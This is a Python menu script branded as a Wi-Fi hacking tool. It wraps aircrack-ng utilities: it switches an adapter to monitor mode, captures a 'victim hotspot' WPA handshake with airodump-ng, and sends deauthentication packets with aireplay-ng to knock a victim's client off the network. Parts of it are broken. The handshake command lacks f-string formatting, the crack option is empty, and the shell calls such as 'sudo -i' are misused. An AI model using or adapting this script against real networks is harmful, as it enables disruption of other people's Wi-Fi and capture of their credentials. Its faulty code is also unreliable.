# created by ARMAN SIR
# CEO of Cywallearn
# Don't modify our scripts
import os
import colorama
from colorama import  Fore,Style
import time
Ye = "\033[1;33;40m"
R = Fore.RED
B = Fore.BLUE
G = Fore.GREEN
C = Fore.CYAN
Y = Fore.YELLOW
M = Fore.MAGENTA
W = Fore.WHITE

os.system ("clear") 

bn = f"""
          {M} CYWALLEARN {Y}
                     {R}   Live Crouse {W}
          {B}ADVANCED
          
   {C} ᴊᴏɪɴ ɴᴏᴡ ᴄᴏɴᴛᴀᴄᴛ +𝟿𝟷𝟿𝟾𝟽𝟻𝟻𝟹𝟶𝟶𝟼𝟶\n
"""
xy=f"""


    \t {R} WIFI HACKING {B}TOOL SPECIAL FOR {G}RAJU BAHI{W}
 \n
    
       
             
"""
print (bn)
print (xy)
print (f"{M}Disclaimer use {R}root terminal")
# Installing 
print (f"{G}installing prosess {B} wait few minutes\n")

"""os.system ("sudo apt-get update && upgrade")
os.system ("sudo apt-get install airmon-ng")"""

# main function don't edit any script
"""01000101 01110110 01100101 01110010 01111001 01110100 01101000 01101001 01101110 01100111 00100000 01101000 01100001 01100011 01101011 0010"""

# menu
print (f'\n {G} Install Driver {Ye} (1)')
print (f'\n {G} Setup Driver {Ye} (*)')
print (f'\n \033[1;32;40mChange Monitor mode {Ye} (2)')
print (f'\n {G}Capture Handshake File{Ye} (3)')
print (f'\n {G}Send Deauth Pac{Ye} (4)')
print (f'\n {G}Crack Handshake{Ye} (5)')
while True :
    usr= input (f"\n{R}Choose Your Option : {Ye}")
    
    if usr == "1":
        pass 
        os.system("sudo apt update")
        os.system("sudo apt install bc")
        os.system("sudo apt-get install build-essential")
        os.system("sudo apt-get install libelf-dev")
        os.system("""sudo apt-get install linux-headers-`uname -r`""")
        os.system("""sudo apt-get install linux-headers-5.10.0-kali6-amd64""")
        os.system("sudo apt install dkms")
        os.system("sudo rmmod r8188eu.ko")
        os.system("""git clone https://github.com/aircrack-ng/rtl8188eus""")
        print (R)
        os.system("sudo -i")
        os.system("""path | echo "blacklist r8188eu" > "/etc/modprobe.d/realtek.conf" """)
        print (f"""{G}Packages download success {C} reboot your system""")
        time.sleep(1)
        os.system("exit")
    
    elif usr == "*":
        print (G)
        os.system("sudo apt update -y")
        

    elif usr == "2":
    # Change mode
        print (R)
        print ()
        print (f"{C} Connect Your WI-FI adaptor\n")
        time.sleep(5)
        print (Y)
        os.system ("iwconfig")
        time.sleep(0.5)
        print (R)
        os.system ("iwconfig wlan1 down")
        time.sleep(2)
        print (R)
        os.system ("iwconfig wlan1 mode monitor")
        print (M)
        time.sleep(2)
        os.system ("iwconfig wlan1 up")
        print (B)
        os.system ("iwconfig")
        print ("\n check monitor mod ")
        print (G)
        # capture handshake
        print (f"\n{Ye}Now open a new terminal")
        os.system ("airodump-ng wlan1")
        break
    elif usr == "3":
        Victim = input(f"enter your victim hotspot BSSID: {W}")
        print (C)
        victim_chan = int(input (f"enter channel id: {W} "))
        print (M)
        hand = input(f"enter your cap file name: {W} ")
        print (R)
        time.sleep(3)
        os.system("airodump-ng --bssid {Victim} --channel {victim_chan} --write {hand} wlan1")
        break
    elif usr == "4":
        """deauth packed send"""
        hos = input (f"\nEnter Victim BSSID:{W} ")
        dc = input (f"""\n{R}Enter Victim Hotspot contacted User BSSID: {W} """)
        sd = int(input (f"{R}\nSend death packed: {W} "))
        os.system(f"""aireplay-ng --deauth {sd} -a {hos} -c {dc} wlan1""")
        break
    elif usr == "5":
        pass
        break
    elif usr == "exit": # Extra function
        os.system("exit")
        break
    else :
        print (f"\n{R}[×]invalid option\n")
        